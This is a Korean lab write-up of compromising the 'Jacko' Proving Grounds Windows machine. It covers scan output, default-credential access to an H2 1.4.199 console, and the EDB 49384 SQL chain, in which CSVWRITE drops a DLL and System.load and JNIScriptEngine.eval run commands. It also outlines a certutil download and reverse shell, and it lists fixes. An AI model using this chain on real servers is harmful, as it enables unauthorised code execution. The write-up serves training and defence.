---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/web/default-creds
  - tech/web/rce
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.120.66
ports: [80, 135, 139, 445, 8082, 9092]
services: [http, microsoft-ds, msrpc, netbios-ssn, xmlipcregsvc]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.120.66` · Windows 10(빌드 10.0.18363.836) · Intermediate · **플래그 2개 중 1개**
> 진입점: 8082 H2 Database Console **1.4.199** → `sa` / 빈 비밀번호 접속 → EDB 49384(`CSVWRITE` 로 DLL 투하 → `System.load` → JNI `eval` 로 `Runtime.exec`) → certutil 로 msfvenom exe 반입·실행 → `C:\Program Files (x86)\H2\service` 셸 → `C:\Users\tony\Desktop\local.txt`
> 권한상승: **미완.** 셸 안에서 열거를 실행한 기록이 없고 `proof.txt` 미확보
> 시행착오·교훈 → [[_PLAYBOOK]]

작업일 2026-07-10. 당시 Kali `tun0` = **192.168.45.215** — 현재는 다른 주소이므로 이 노트에 실린 명령의 LHOST 를 그대로 복사하지 말 것.

## Target #1 – 192.168.120.66

### Initial Access – 무인증 노출된 H2 Database Console 이 CSVWRITE 파일쓰기와 CREATE ALIAS 네이티브 로드로 이어져 원격 코드 실행

**Vulnerability Explanation:** H2 Database 1.4.199 웹 콘솔(8082/tcp)이 무인증 노출됨.

- 콘솔의 「로그인」 화면은 애플리케이션 인증창이 아니라 **JDBC 접속 파라미터 입력창**임. 저장된 설정 `Generic H2 (Embedded)` 기본값 `org.h2.Driver` + `jdbc:h2:~/test` + `sa` + 빈 비밀번호로 그대로 접속됨
- 접속만 되면 `CSVWRITE` 로 임의 경로에 임의 바이트를 쓸 수 있고, `CREATE ALIAS … FOR "java.lang.System.load"` 로 그 파일을 JVM 에 로드할 수 있음. 투하한 DLL 이 등록하는 `JNIScriptEngine.eval` 이 임의 자바 표현식을 평가하므로 `Runtime.exec` 도달
- SQL 인젝션이 아니라 **DB 관리자 권한의 정상 기능 오용**임. EDB 49384 가 `Codes: N/A` 로 **CVE 번호를 갖지 않는 이유**임. ⚠️ 다만 **「CVE 가 없다」가 「버전 조건이 없다」를 뜻하지는 않음** — 이 박스에서 확인한 것은 `1.4.199` 하나이고 익스플로잇 헤더도 `Tested on: … H2 1.4.199` 임. 다른 버전에서의 성립 여부는 확인하지 않음 `[가정]`

**Vulnerability Fix:**

- H2 웹 콘솔을 네트워크에 노출하지 말 것. 이 박스는 9092(H2 TCP 서버)에 원격 접속을 막아뒀으나 8082 웹 콘솔은 열어둠 — **절반만 잠갔고 코드 실행이 되는 쪽이 열려 있었음**
- 콘솔 접근이 곧 코드 실행이므로 「DB 비밀번호를 강하게」는 부차적 대응임. 접근 제어가 유일한 방어선
- DB 엔진을 SYSTEM 급 계정으로 서비스 등록하지 말고 전용 저권한 계정으로 구동할 것
- `C:\Windows\Temp` 등 쓰기 가능 경로의 실행을 AppLocker/WDAC 로 차단하면 DLL 투하와 certutil 반입이 동시에 막힘
- `certutil.exe` 의 아웃바운드를 감시할 것. 서버 계정이 certutil 로 외부 HTTP 를 치는 것은 정상 동작이 아님

**Severity:** Critical — 무인증 원격 코드 실행

**Steps to reproduce the attack:**

1. `-p-` 스캔으로 8082/tcp = H2 Console 확인
2. 콘솔에 `jdbc:h2:~/test` · `sa` · 빈 비밀번호로 접속, 좌측 트리에서 버전 `1.4.199` 확인
3. `searchsploit -m 49384` 로 EDB 49384 회수
4. `CSVWRITE` 로 `C:\Windows\Temp\JNIScriptEngine.dll` 투하 후 `System_load` 별칭으로 JVM 에 로드
5. `JNIScriptEngine_eval` 별칭 → `Runtime.exec` 로 certutil 실행, Kali 에서 msfvenom exe 반입
6. 같은 프리미티브로 반입한 exe 실행 → Kali `nc` 리스너에 셸

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.120.66 | TCP: 80, 135, 139, 445, 5040, 7680, 8082, 9092, 49664-49669 |

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Fri Jul 10 15:38:25 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.66
Nmap scan report for 192.168.120.66
Host is up (0.087s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.98%I=7%D=7/10%Time=6A509371%P=x86_64-pc-linux-gnu%r(NU
SF:LL,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\
SF:0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i
SF:\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0
SF:l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\
SF:0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\
SF:.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n
SF:\0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0
SF:R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x
SF:20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\
SF:x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0
SF:o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\
SF:x009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0
SF:a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0
SF:S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n
SF:\0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g
SF:\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D
SF:\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\
SF:r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.
SF:\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p
SF:\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\
SF:x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informi
SF:x,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=7/10%OT=80%CT=1%CU=30824%PV=Y%DS=4%DC=T%G=Y%TM=6A50942
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=FF%GCD=1%ISR=10D%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-07-10T06:41:36
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   86.69 ms 192.168.45.1
2   86.68 ms 192.168.45.254
3   87.06 ms 192.168.251.1
4   87.11 ms 192.168.120.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 10 15:41:50 2026 -- 1 IP address (1 host up) scanned in 205.28 seconds
```

— 출처: `~/PG/Jacko/nmap.log`

`nnmap` 은 `~/.zshrc:247` 별칭임 — `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`. `-oN nmap.log` 가 박혀 있어 작업 디렉터리를 안 바꾸면 이전 박스 로그를 덮어씀.

**이 스캔에서 실제로 읽어야 할 줄은 셋임.**

`80/tcp … http-title: H2 Database Engine (redirect)` — IIS 가 서비스하지만 내용물은 H2. 즉 80 은 애플리케이션이 아니라 **H2 문서 사이트**임(디렉터리 열거에서 확정됨).

`8082/tcp open http H2 database http console` — 진짜 입구. nmap 이 이름까지 붙여줌.

`9092/tcp open XmlIpcRegSvc?` — 서비스 이름은 오탐임. 진짜 정보는 그 아래 `SF-Port9092-TCP:` 지문 블록 안에 있음. `\0R\0e\0m\0o\0t\0e\0…` 처럼 **글자마다 앞에 `\0` 이 붙는 것은 UTF-16BE** 임 — 널바이트가 뒤가 아니라 앞에 옴. `\0` 을 걷어내면 이렇게 읽힘(위 nmap 블록을 손으로 디코드한 것이고 별도로 접속해본 것이 아님):

> `org.h2.jdbc.JdbcSQLNonTransientConnectionException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-199]`

엔디언을 반대로 잡으면 같은 바이트가 `刀攀洀漀琀攀` 같은 CJK 로 풀림. `python3 -c "print(bytes.fromhex('005200650…').decode('utf-16-be'))"` 로 때려보는 편이 눈으로 세는 것보다 빠름.

9092 = H2 의 TCP 서버이고 원격 접속이 꺼져 있음. JDBC 를 그쪽에 붙이려는 시도는 시작 전에 끝난 셈 — **지문 하나가 막다른 길 하나를 지움.** 덤으로 에러 문자열 꼬리의 `-199` 가 나중에 콘솔에서 본 **1.4.199** 와 일치함. H2 가 예외 메시지에 `[에러코드-빌드번호]` 를 붙인다는 관례 자체는 이 박스에서 확인한 것이 아니고 두 값이 맞았다는 관측만 있음 `[가정]`. 그렇다면 **셸을 잡기 전에 nmap 만으로 정확한 버전을 알 수 있었음.**

135/139/445 는 열려 있으나 SMB 를 열거한 기록이 산출물·히스토리 어디에도 없음. 5040(`unknown`)·7680(Delivery Optimization)도 손대지 않음. **배제한 것이 아니라 시도하지 않은 것임.**

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ whatweb http://192.168.120.66 > whatweb.txt

┌──(kali㉿kali)-[~/PG/Jacko]
└─$ cat whatweb.txt
http://192.168.120.66 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.120.66], Microsoft-IIS[10.0], Script[text/javascript], Title[H2 Database Engine (redirect)][Title element contains newline(s)!]
```

— 출처: `~/PG/Jacko/whatweb.txt`

nmap 이 준 것 이상은 없음. 40초짜리 확인이라 손해는 아님. ⚠️ `whatweb` 은 도메인·기술을 오탐한 전례가 있으므로 버전·게이트 판정 근거로 쓰지 말 것 — 여기서도 판정은 nmap raw 와 콘솔 화면으로 함.

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ feroxbuster -u http://192.168.120.66/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.120.66/
 🚩  In-Scope Url          │ 192.168.120.66
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://192.168.120.66/help => http://192.168.120.66/help/
301      GET        2l       10w      152c http://192.168.120.66/images => http://192.168.120.66/images/
200      GET       46l      151w     1455c http://192.168.120.66/html/main.html
200      GET       44l      182w     1595c http://192.168.120.66/index.html
200      GET      379l      692w     5971c http://192.168.120.66/html/stylesheet.css
200      GET       44l      182w     1595c http://192.168.120.66/
301      GET        2l       10w      150c http://192.168.120.66/html => http://192.168.120.66/html/
403      GET       29l       92w     1233c http://192.168.120.66/text/
403      GET       29l       92w     1233c http://192.168.120.66/html/
301      GET        2l       10w      157c http://192.168.120.66/html/images => http://192.168.120.66/html/images/
200      GET      195l      644w     6008c http://192.168.120.66/html/navigation.js
200      GET      708l     2458w    22700c http://192.168.120.66/html/links.html
200      GET      325l     1591w    14266c http://192.168.120.66/html/build.html
200      GET      893l     5360w    40969c http://192.168.120.66/html/performance.html
200      GET     1719l     9513w    73694c http://192.168.120.66/html/features.html
200      GET     1487l     7328w    52442c http://192.168.120.66/html/changelog.html
200      GET       76l      197w     2899c http://192.168.120.66/html/download.html
200      GET     1502l     7485w    58013c http://192.168.120.66/html/tutorial.html
200      GET     1968l    11802w    89524c http://192.168.120.66/html/advanced.html
200      GET      288l     1694w    13240c http://192.168.120.66/html/faq.html
200      GET      105l      464w     3873c http://192.168.120.66/html/quickstart.html
200      GET      178l      391w     5083c http://192.168.120.66/html/grammar.html
200      GET       99l      233w     2884c http://192.168.120.66/html/datatypes.html
200      GET      189l     1242w   105089c http://192.168.120.66/html/images/connection-mode-remote-2.png
200      GET      176l     1099w    86253c http://192.168.120.66/html/images/connection-mode-embedded-2.png
200      GET      261l     1539w   126490c http://192.168.120.66/html/images/connection-mode-mixed-2.png
200      GET      182l      749w     6831c http://192.168.120.66/html/history.html
301      GET        2l       10w      150c http://192.168.120.66/text => http://192.168.120.66/text/
200      GET       52l      199w     1366c http://192.168.120.66/html/source.html
200      GET       58l      297w    21408c http://192.168.120.66/html/images/db-64-t.png
200      GET      404l     4638w    31361c http://192.168.120.66/html/license.html
200      GET      221l     1449w   124258c http://192.168.120.66/html/images/console-2.png
200      GET      179l      395w     5151c http://192.168.120.66/html/commands.html
200      GET      532l     5166w    41042c http://192.168.120.66/html/roadmap.html
200      GET       40l      158w     1334c http://192.168.120.66/html/frame.html
200      GET      154l      581w     5535c http://192.168.120.66/html/architecture.html
200      GET      122l      367w     3719c http://192.168.120.66/html/installation.html
200      GET        1l        2w      186c http://192.168.120.66/html/images/icon_disconnect.gif
200      GET      250l      847w    54735c http://192.168.120.66/html/images/quickstart-6.png
200      GET       25l      306w    20922c http://192.168.120.66/html/images/quickstart-3.png
200      GET       12l       84w     6917c http://192.168.120.66/html/images/quickstart-2.png
200      GET      213l      682w    53950c http://192.168.120.66/html/images/quickstart-4.png
200      GET       56l      330w    25271c http://192.168.120.66/html/images/quickstart-1.png
200      GET      267l      767w    64736c http://192.168.120.66/html/images/quickstart-5.png
200      GET      324l      686w     9218c http://192.168.120.66/html/functions.html
200      GET      749l     5113w    33189c http://192.168.120.66/html/mvstore.html
200      GET       24l      148w     8398c http://192.168.120.66/html/images/h2-logo-2.png
200      GET      216l      545w     6760c http://192.168.120.66/html/cheatSheet.html
200      GET      273l      939w     8212c http://192.168.120.66/html/search.js
200      GET      252l      820w     7734c http://192.168.120.66/html/sourceError.html
200      GET       24l       78w      862c http://192.168.120.66/javadoc/index.html
200      GET       63l      340w     2578c http://192.168.120.66/html/systemtables.html
200      GET      130l      369w     5001c http://192.168.120.66/html/fragments.html
200      GET       98l      311w     5241c http://192.168.120.66/javadoc/classes.html
200      GET       38l      122w     1115c http://192.168.120.66/javadoc/overview.html
200      GET      171l      283w     2165c http://192.168.120.66/javadoc/stylesheet.css
200      GET       24l       78w      862c http://192.168.120.66/javadoc/
301      GET        2l       10w      153c http://192.168.120.66/javadoc => http://192.168.120.66/javadoc/
[###################>] - 18m  4246480/4360635 31s     found:58      errors:0
[###################>] - 18m   613254/622887  563/s   http://192.168.120.66/
[####################] - 20m  4360635/4360635 0s      found:58      errors:0
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/help/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/images/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/text/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/html/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/html/images/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/javadoc/
```

**58건 전부가 H2 배포판에 딸려오는 문서임.** `html/features.html`·`html/changelog.html`·`javadoc/` — 애플리케이션이 아니라 `h2/docs` 디렉터리를 IIS 로 그대로 노출한 것. 20분을 태워 얻은 결론은 「80번에는 아무것도 없다」 한 줄이었음. 다만 이 20분을 기다리지는 않음 — 익스플로잇을 확보한 `49384.txt` 의 mtime 이 **15:50:27** 로 feroxbuster 가 아직 돌던 시점임(→ [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-18. 배경 스캔이 도는데 같은 스캔을 손으로 또 돌렸다]]).

**버전 판정 독립 근거 2개** — ① nmap 9092 지문의 `[90117-199]` ② 콘솔 좌측 트리의 `H2 1.4.199 (2019-03-13)`. 두 값이 일치.

### Initial Access – H2 Console → JNI 코드 실행

8082 를 열면 나오는 화면.

![[Pasted image 20260710161232.png]]

칸은 드라이버 클래스 / JDBC URL / 사용자명 / 비밀번호임. 애플리케이션 로그인 폼이 아니라 **JDBC 접속 문자열 조립기**임. 저장된 설정 `Generic H2 (Embedded)` 의 기본값이 `org.h2.Driver` + `jdbc:h2:~/test` + 사용자 `sa` 이고 비밀번호는 빈 칸.

원본 노트는 여기서 「H2 초기 패스워드」를 검색함.

![[Pasted image 20260710161258.png]]

그대로 연결을 누르니 붙음.

![[Pasted image 20260710161324.png]]

좌측 트리에 `jdbc:h2:~/test` 와 **H2 1.4.199 (2019-03-13)** 이 찍힘.

**빈 비밀번호가 왜 통했는가** — 두 설명이 가능하고 **이 기록만으로는 구분되지 않음.** ① `sa` 계정의 비밀번호가 실제로 빈 값이었음 ② `~/test` 데이터베이스가 없어 접속 시점에 새로 생성됐고 새 DB 의 소유자 자격증명이 입력값(`sa` / 빈 문자열)으로 정해졌음. H2 임베디드 모드의 알려진 동작은 ②쪽이나 **이 박스에서 확인하지 않음** `[가정]`.

실전에서 갈림길이 되는 것이 이 구분임. ②라면 **자격증명을 맞힐 필요가 아예 없음** — 아무 경로나 적어 새 DB 를 만들고 그 안에서 SQL 을 실행하면 됨. 콘솔이 열려 있다는 것 자체가 이미 코드 실행.

```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ searchsploit h2 1.4.199
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
H2 Database 1.4.199 - JNI Code Execution                            | java/local/49384.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/Jacko]
└─$ searchsploit -m 49384
  Exploit: H2 Database 1.4.199 - JNI Code Execution
      URL: https://www.exploit-db.com/exploits/49384
     Path: /usr/share/exploitdb/exploits/java/local/49384.txt
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (64895)
Copied to: /home/kali/PG/Jacko/49384.txt
```

— 출처: `~/PG/Jacko/49384.txt`(15:50:27 회수)

`Codes: N/A` 가 중요함. **CVE 번호가 없음** — 패치로 막을 버그가 아니라 「DB 관리자는 원래 이 정도는 할 수 있다」는 설계를 그대로 쓴 것임. ⚠️ 여기서 **「그러므로 어느 버전에서나 통한다」로 넘어가지 말 것** — 별개의 주장이고 이 박스에서 확인되지 않음 `[가정]`. `File Type` 의 `(64895)` 를 줄 길이로 읽지 말 것(실제 최장 행은 124,111자)(→ [[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]]).

익스플로잇 본문은 SQL 세 덩어리임. 파일은 23행짜리 텍스트인데 125,140바이트이고 그중 **15행 한 줄이 124,111자**임 — DLL 전체를 `CHAR(0x..)` 로 풀어 쓴 `CSVWRITE` 줄이 거기 있음. 나머지를 다 합쳐도 1KB 미만(`awk '{print NR": "length}' 49384.txt` 실측 — 15행만 124111 이고 나머지 22행 합이 1KB 미만).

**① 네이티브 DLL 을 디스크에 쓴다**

```sql
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "',
  CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00), ... ,'"'), 'ISO-8859-1', '', '', '', '', '');
```

조각별 역할:

- `CHAR(0x4d),CHAR(0x5a),…` — `MZ` 로 시작하는 PE 바이트를 한 바이트씩 문자로 만듦. SQL 콘솔에는 바이너리를 붙여넣을 방법이 없으니 텍스트로 표현한 것
- `CONCAT('SELECT NULL "', …, '"')` — 그 바이트열을 컬럼 별칭으로 감싼 SQL 문을 문자열로 조립. `CSVWRITE` 는 두 번째 인자를 쿼리로 돌려 결과를 CSV 로 내보내는데 **헤더 줄에 컬럼 이름이 들어감.** 즉 파일에 기록되는 실체가 별칭 = DLL 바이트임. 데이터 행은 `NULL` 하나뿐이라 남는 것이 없음
- `'ISO-8859-1'` — 0x00–0xFF 가 바이트와 1:1 대응하는 인코딩이어야 함. UTF-8 이면 0x80 이상이 2바이트로 부풀어 PE 가 깨짐
- 뒤따르는 다섯 개의 `''` — 구분자·인용부호·이스케이프·NULL 표기 같은 서식 인자를 전부 빈 문자열로 만들어 **헤더 이외의 문자가 파일에 섞이지 않게** 함

위 네 줄은 익스플로잇 본문의 인자 배치와 결과에서 역산한 설명임. H2 `CSVWRITE` 의 시그니처 원문을 따로 확인하지는 않음 `[가정]`.

`C:\Windows\Temp` 를 쓰는 것은 어느 계정으로 돌든 쓰기 가능한 몇 안 되는 경로이기 때문.

**② JVM 에 로드한다**

```sql
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
```

`CREATE ALIAS … FOR "<완전한 자바 메서드명>"` 은 H2 의 사용자 정의 함수 기능임. **자바 컴파일러가 필요 없는** 형태 — 이미 클래스패스에 있는 정적 메서드를 그대로 SQL 함수로 노출함. 익스플로잇 헤더가 굳이 이 점을 적어둔 이유가 여기 있음. H2 는 자바 소스를 인라인 컴파일하는 경로도 갖고 있으나 그쪽은 **JDK 가 깔려 있어야** 하고 타겟에 JRE 만 있으면 실패함. JNI 경로가 그 의존성을 우회함.

**③ 그 DLL 이 등록한 네이티브 함수로 명령을 실행한다**

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

`JNIScriptEngine.eval` 은 문자열을 자바 스크립트 엔진으로 평가하므로 인자 안에 자바 코드를 통째로 써넣을 수 있음. `useDelimiter("\\Z")` 는 `Scanner` 의 구분자를 「입력 끝」으로 바꿔 **출력 전체를 한 토큰으로** 읽어오게 하는 관용구임 — 없으면 첫 공백까지만 돌아옴.

> [!warning] 이 프리미티브의 한계
> `Runtime.exec` 는 **한 번에 한 프로세스**이고 셸이 아님. 파이프도 리다이렉션도 `&&` 도 안 먹음(`exec` 는 셸을 거치지 않음). stdout 만 문자열로 돌아옴. 그래서 **다운로드 → 실행**을 두 번의 `CALL` 로 쪼갬.

**페이로드 준비.** `~/.zsh_history` 에 남은 msfvenom 호출은 네 줄이고 순서대로:

```bash
